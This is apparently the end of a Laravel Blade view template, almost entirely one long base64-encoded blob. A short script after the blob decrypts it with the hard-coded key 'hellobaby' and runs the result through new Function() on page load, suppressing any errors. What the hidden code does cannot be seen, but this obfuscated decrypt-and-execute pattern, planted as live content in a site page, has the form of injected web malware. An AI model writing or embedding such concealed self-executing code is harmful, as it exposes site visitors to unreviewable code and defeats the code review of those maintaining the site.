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";
const KEY="hellobaby";
try{const decrypted=decryptIt(ENCRYPTED,KEY);if(decrypted){const func=new Function(decrypted);func();}}catch(error){console.error('Execution error:',error);}
})();
</script>
@endsection